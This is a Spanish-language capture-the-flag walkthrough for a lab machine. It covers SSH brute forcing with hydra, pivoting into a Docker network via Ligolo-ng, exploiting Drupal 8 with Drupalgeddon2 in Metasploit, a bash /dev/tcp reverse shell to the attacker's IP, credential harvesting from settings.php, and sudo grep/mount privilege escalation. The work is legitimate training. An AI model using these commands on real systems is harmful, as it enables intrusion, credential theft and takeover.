- Tags: #SSHL #PortForwarding #LigoloNG #Drupal
# Writeup Template: Maquina `[ Pa Que Aiga Lujo ]`

- Tags: #PaQueAigaLujo
- Dificultad: `[Baja/Media/Alta/Insane]`
- Plataforma: `[ The Hackers Labs ]`

---
## Configuracion del Entorno
**Nota:** Pagina oficcioal donde descargo los laboratorios: [The Hackers Labs](https://labs.thehackerslabs.com/)
- Descargamos el archivo **( .ova )**
- Descomprimimos el archivo **zip**
- Importamos el **ova** en **virtualBox**

---
## Fase de Reconocimiento
```bash
sudo arp-scan -I wlan0 --localnet --ignoredups
nmap -sn 192.168.100.0/24
```

### Direccion IP del Target
```bash
Nmap scan report for 192.168.100.30
Host is up (0.00077s latency).
MAC Address: 08:00:27:DF:2E:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 192.168.100.30
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 192.168.100.30
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 192.168.100.30 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.100.30 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 192.168.100.30 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((DebianOracular))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://192.168.100.30/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://192.168.100.30
http://192.168.100.30 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], Email[info@luxecollection.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[192.168.100.30], Script, Title[LuxeCollection - Artículos de Lujo Exclusivos]
```
### Descubrimiento de Archivos y Rutas
```bash
gobuster dir -u http://192.168.100.30 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 100 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/scripts              (Status: 301) [Size: 318] [--> http://192.168.100.30/scripts/]
/index.html           (Status: 200) [Size: 15656]
/styles               (Status: 301) [Size: 317] [--> http://192.168.100.30/styles/]
```

Si enumeramos la ruta de scripts no encontraremos nada
```bash
gobuster dir -u http://192.168.100.30/scripts/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 100 -x php,php.back,backup,txt,sh,html,js,java,py
```
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora revisando la web tenemos nombres, los cuales guardaremos en una lista de usuarios potenciales
```bash
carlos
Carlos 
miguel
Miguel 
isabella
Isabella 
elena
Elena 
alexandre 
Alexandre
victoria
Victoria 
roberto
Roberto 
anastasia 
Anastasia
james
James 
sophia
Sophia 
catherine
Catherine 
margot
Margot 
valentina
Valentina 
beatrice
Beatrice 
priscilla
Priscilla 
alessandro
Alessandro 
winston
Winston 
marcus 
maximilian
Maximilian 
diego
Diego
```

### Ejecucion del Ataque
Procedemos a realizar un ataque de fuerza bruta pro shh
```bash
# Comandos para explotación
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -u -f -t 4 -V ssh://192.168.100.30
```

Tenemos credenciales validas:
```bash
[STATUS] 69.87 tries/min, 229 tries in 00:04h, 14344190 to do in 3432:38h, 5 active
[22][ssh] host: 192.168.100.30   login: Sophia   password: dolphins
```

### Intrusion
Ahora que tenemos las credenciales nos conectamos por **ssh**
```bash
# Reverse shell o acceso inicial
ssh Sophia@192.168.100.30 # dolphins
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Enumeracion de usuarios
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
Sophia:x:1001:1001:,,,:/home/Sophia:/bin/bash
cipote:x:1002:1002:,,,:/home/cipote:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ Sophia ]`:
Realizando la enumeracion, Determinamos que existe una red interna
```bash
ip a

3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c1:47:1d:27 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:c1ff:fe47:1d27/64 scope link 
       valid_lft forever preferred_lft forever
```

Procedemos a enumerar host activos
```bash
for target in {1..100}; do (ping -c 1 172.17.0.$target | grep "bytes from" | awk '{print $4}' | tr ':' ' ' &); done
```

Resultado obtenido
```bash
172.17.0.1 # Representa al host vulnerado 
172.17.0.2 # Objetivo
```

Sabiendo que tenemos traza con el objetivo, Verificamos el rango de puertos con el siguiente script, 
Guardamos el la direccion ip del objetivo en un archivo: **target.txt** y nuestro script se llamara **scanPorts.sh**
```bash
#!/usr/bin/bash 

while read host; do
  echo -e "\n[+] Iniciando escaneo en el objetivo: $host"
  for port in {1..1000}; do 
    timeout 1 bash -c "echo > /dev/tcp/$host/$port" 2>/dev/null && echo "[*] Port Active: $port"
  done
  echo ""
done < target.txt
```

Damos permisos de ejecucion:
```bash
chmod +x scanPorts.sh
```

Procedemos a ejecutarlo:
```bash
./scanPorts.sh
```

Resultado:
```bash
[+] Iniciando escaneo en el objetivo: 172.17.0.2
[*] Port Active: 80
```

Ahora que sabemos que existe el puerto 80 en la red interna necesitamos traernos mediante un tunel el trafico de ese puerto
Ahora indicamos que nuestro puerto 8000 de atacante sera el puerto 80 de la maquina victima:
```bash
ssh -L 8000:172.17.0.2:80 Sophia@192.168.100.30 # dolphins

The authenticity of host '192.168.100.30 (192.168.100.30)' can't be established.
ED25519 key fingerprint is SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.30' (ED25519) to the list of known hosts.
Sophia@192.168.100.30's password: 
Linux TheHackersLabs-PaQueAigaLujo 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug 22 21:33:29 2025 from 192.168.100.26
```

Vemos que se ejecuto correctamente nuestra instruccion mediante el codigo de estado
```bash
echo $?
0
```

**Ligolo** es un tunelador inverso que crea una VPN entre tu máquina atacante y la víctima, permitiéndote redirigir tráfico fácilmente.
Usamos **Ligolo** para crear el tunel y poder traernos el trafico de el objetivo a nuestra maquina **ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz**:
```bash
https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2
```

Descomprimimos el archivo:
```bash
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz

.rwxr-xr-x kali kali  19 MB Sat May 24 19:08:42 2025  proxy
```

Ya tenemos el **proxy** con permsos de ejecucion, En caso de que no los tenga aplicamos con este comando:
```bash
chmod +x proxy
```

Ahora desde la maquina victima con el usuario **Sophia** descargamos el agente de ligolo
```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
```

Ahora la victama tendra en su directorio personal el siguiente, archivo comprimido
```bash
ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
```

procedemos a descomprimirlo y si no tiene persimos de ejecucion, Se los aplicamos
```bash
-rwxr-xr-x 1 Sophia Sophia 6475928 may 24 21:06 agent
```

Ahora desde nuestra maquina atacante ejecutamos el **proxy**
```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? Yes
? Allow CORS Access from https://webui.ligolo.ng? Yes
WARN[0011] WebUI enabled, default username and login are ligolo:password - make sure to update ligolo-ng.yaml to change credentials! 
WARN[0011] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0011] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0011] Listening on 0.0.0.0:11601                   
INFO[0011] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
WARN[0011] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng »  
```

Ahora desde nuestra maquina atacante transferimos el **Agente** a la maquina victima en la ruta: **/tmp**:
```bash
scp agent Sophia@192.168.100.24:/tmp/
Sophia@192.168.100.24's password: dolphins
proxy 
```

Ahora Ejecutamos el agente en la maquina victima
```bash
/tmp/agent -connect 192.168.100.26:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="192.168.100.26:11601"
```

Ahora necestiamos crear el tunel para poder llegar a la interfaz del segundo objetivo, 
Creamos una nueva interfaz, Para poder llegar a la red del objetivo
```bash
sudo ip tuntap add user Tu_Nombre_Usuario mode tun ligolo
```

Ahora iniciamos la nueva interfaz creada:
```bash
sudo ip link set ligolo up
```

Ahora creamos la ruta, Para que **ligolo** sepa a donde tiene que redirigir el trafico 
```bash
sudo ip route add 172.17.0.2 dev ligolo
```

Ahora desde la interfaz de **ligolo**, listamos las interfazes, 
```bash
? Specify a session :  [Use arrows to move, type to filter]
> 1 - Sophia@TheHackersLabs-PaQueAigaLujo - 192.168.100.24:44544 - 0800273ff508
```

Escribmos el numero **1** y damos enter para seleccionar esa session
```bash
? Specify a session : 1 - Sophia@TheHackersLabs-PaQueAigaLujo - 192.168.100.24:44544 - 0800273ff508
```

Ahora iniciamos el tunel
```bash
[Agent : Sophia@TheHackersLabs-PaQueAigaLujo] » start
INFO[0976] Starting tunnel to Sophia@TheHackersLabs-PaQueAigaLujo (0800273ff508)
```

Ahora para comprobar si ha funcionado correctamente, Lanzamos una traza **ICMP**
```bash
ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=4.01 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 4.005/4.005/4.005/0.000 ms
```

Ya podemos acceder desde la web para empezar a auditar este servicio web atraves del tunel
```bash
http://172.17.0.2/
```

Inicimaos reconociendo las tecnologias usadas para este servicio web
```bash
whatweb http://172.17.0.2/
http://172.17.0.2/ [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.17.0.2], MetaGenerator[Drupal 8 (https://www.drupal.org)], PHP[7.2.3], PoweredBy[-block], Script, Title[Welcome to Find your own Style | Find your own Style], UncommonHeaders[x-drupal-dynamic-cache,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.2.3], X-UA-Compatible[IE=edge]
```

De igal manera desde le codigo fuente lo confirmamos:
```bash
curl -s -X GET http://172.17.0.2 | grep "drupal"
<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
```

Realizamos fuzzing de rutas:
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 100 -x php,php.back,backup,txt,sh,html,zip,js,java,py --no-error
```

Tenemos las siguientes rutas:
```bash
/index.php            (Status: 200) [Size: 8860]
/contact              (Status: 200) [Size: 12134]
/search               (Status: 302) [Size: 360] [--> http://172.17.0.2/search/node]
/themes               (Status: 301) [Size: 309] [--> http://172.17.0.2/themes/]
/user                 (Status: 302) [Size: 356] [--> http://172.17.0.2/user/login]
/modules              (Status: 301) [Size: 310] [--> http://172.17.0.2/modules/]
/sites                (Status: 301) [Size: 308] [--> http://172.17.0.2/sites/]
```

Si intentamos ver las configuracion de la base de datos no tenemos acceso
```bash
http://172.17.0.2/sites/default/settings.php
```

Revisanso este archivo:
```bash
http://172.17.0.2/core/CHANGELOG.txt

New minor (feature) releases of Drupal 8 are released every six months and
patch (bugfix) releases are released every month. More information on the
Drupal 8 release cycle: https://www.drupal.org/core/release-cycle-overview

* For a full list of fixes in the latest release, visit:
 https://www.drupal.org/8/download
* API change records for Drupal core:
 https://www.drupal.org/list-changes/drupal
```

Ahora clonaremos este explioit para **drupal**
```bash
git clone https://github.com/dreadlocked/Drupalgeddon2
```

Instalamos la gema **highline** de ruby
```bash
gem install highline
```

Ejecutamos el exploit
```bash
ruby drupalgeddon2.rb http://172.17.0.2
```

**Nota** Nuestro exploit no funciona ya que por esta razon
```bash
[!] MISSING: http://172.17.0.2/includes/bootstrap.inc    (HTTP Response: 404)
[-] The target timed out ~ Failed to open TCP connection to 172.17.0.2:80 (execution expired)
```

Asi que procedemos a usar **metasploit** para ganar acceso al objetivo
```bash
# Iniciamos metasploit
msfconsole
```

Iniciamos la busque del exploit
```bash
msf6 > search drupal 8
```

Ahora usaremos el siguiente exploit
```bash
#   Name                                           Disclosure Date  Rank       Check  Description
-   ----                                           ---------------  ----       -----  -----------
0   exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
```

Seleccionamos el exploit numero 0
```bash
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
```

Ahora necesitamos ver las configuraciones, para setearlas:
```bash
show options
```

Como tenemos la conexion atraves de la interfaz de ligolo, Seteamos la ip y el puerto del objetivo
```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOST 172.17.0.2
RHOST => 172.17.0.2
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 80
```

Todo lo demas esta configurado por defecto, En caso de que no seteamos los valores,
Ahora ejecutamos el exploit
```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit
[*] Started reverse TCP handler on 192.168.100.26:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (40004 bytes) to 192.168.100.24
[*] Meterpreter session 1 opened (192.168.100.26:4444 -> 192.168.100.24:55892) at 2025-08-24 23:28:45 +0000
```

Ahora lanzamos una shell para poder ejecutar comandos:
```bash
meterpreter > shell
Process 290 created
```

Tenemos ejecucion de comandos:
```bash
Channel 0 created.                                                                                                                                                                                                                                                            
whoami                                                                                                                                                                                                                                                                        
www-data
```

Ahroa para ganar acceso al objetivo en una nueva terminal nos ponemos en escucha
```bash
nc -nlvp 443
```

Ahroa ganamos acceso desde **metasploit**
```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.100.26/443 <&1'
```

###### Usuario `[ www-data ]`:
Enumerando los usuarios de este sistema:
```bash
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
ballenita:x:1000:1000:ballenita,,,:/home/ballenita:/bin/bash
```

Listando el **home** vemos que tenemos capacidad de atravesar el directorio de este usaurio **ballenita**
```bash
drwxr-xr-x 2 ballenita ballenita 4096 Oct 16  2024 ballenita
```

Ahora podemos acceder a la siguiente ruta para ver ls configuraciones de las bases de datos:
```bash
/var/www/html/sites/default/settings.php
```

Revisando el archivo tenemos las credenciales de el usuario **ballenita**: Las cuales usaremos para intentar loguearnos como este usuario
```bash
 @code
 * $databases['default']['default'] = array (
 *   'database' => 'database_under_beta_testing', // Mensaje del sysadmin, no se usar sql y petó la base de datos jiji xd
 *   'username' => 'ballenita',
 *   'password' => 'ballenitafeliz', 
 *   'host' => 'localhost',
 *   'port' => '3306',
 *   'driver' => 'mysql',
 *   'prefix' => '',
 *   'collation' => 'utf8mb4_general_ci',
 * );
 * @endcode
 */
```

Escalamos de usuario:
```bash
su ballenita # ballenitafeliz
```

###### Usuario `[ ballenita ]`:
Listando los permisos para este usaurio tenemos lo siguiente
```bash
sudo -l 

User ballenita may run the following commands on 76f1a1515e36:
    (root) NOPASSWD: /bin/ls, /bin/gre
```

Nos aprovechamos para ver los archivos de **root**
```bash
sudo -u root /bin/ls -la /root
```

Tenemos un archivo que necesitamos ver su contenido
```bash
-rw-r--r-- 1 root root   36 Aug 10 09:43 secretitomaximo.txt
```

Ahora nos aprovechamos del binario de **grep** para ver el contenido:
```bash
sudo -u root /bin/grep '' /root/secretitomaximo.txt

# Tenemnos una postible contrasena
ElcipotedeChocolate-CipotitoCipoton
```

```bash
# Comando para escalar al usuario: ( root )
su root
Password: ElcipotedeChocolate-CipotitoCipoton
```

Tenemos privilegios maximos y ahora tenemos informacion, del usuario **cipote** de primer objetivo, Asi que tambien probramos escas credenciales para ver si existe reutilizacion de credenciales
```bash
# Primer maquina victima
Sophia@TheHackersLabs-PaQueAigaLujo:~$ su cipote
Contraseña: ElcipotedeChocolate-CipotitoCipoton
```

Tenemos la flag de usuario en el directorio de **cipote**
```bash
-r-------- 1 cipote cipote   36 ago  3 12:15 user.txt
```

Listanod los permisos para este usaurio tenemos lo siguiente:
```bash
sudo -l 

User cipote may run the following commands on TheHackersLabs-PaQueAigaLujo:
    (ALL) NOPASSWD: /usr/bin/mount
```

Ahora tenemos una via potencial de escalar a **root**
```bash
sudo -u root /usr/bin/mount -o bind /bin/bash /bin/mount # Primero ejecutamos este comando
sudo mount # Despues ejecutamos este
```

Ahora que ya gamos acceso como **root**, listamos la flag de **root**
```bash
ls -la /root

-r--------  1 root root        36 ago  3 12:16 root.txt
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@TheHackersLabs-PaQueAigaLujo:/home/cipote# echo -e "\n[+] Pwned: $(whoami)\n"

[+] Pwned: root
```

**Nota** Para eliminar la interfaz de ligolo y limpiar la configuracion
```bash
sudo ip route del 172.17.0.2 dev ligolo # Eliminamos la ruta creada
sudo ip link set ligolo down # Damos de baja la interfaz
sudo ip tuntap del mode tun name ligolo # Eliminamos la interfaz tun

# Verficamos la eliminacion
ip link show
ip tuntap show
```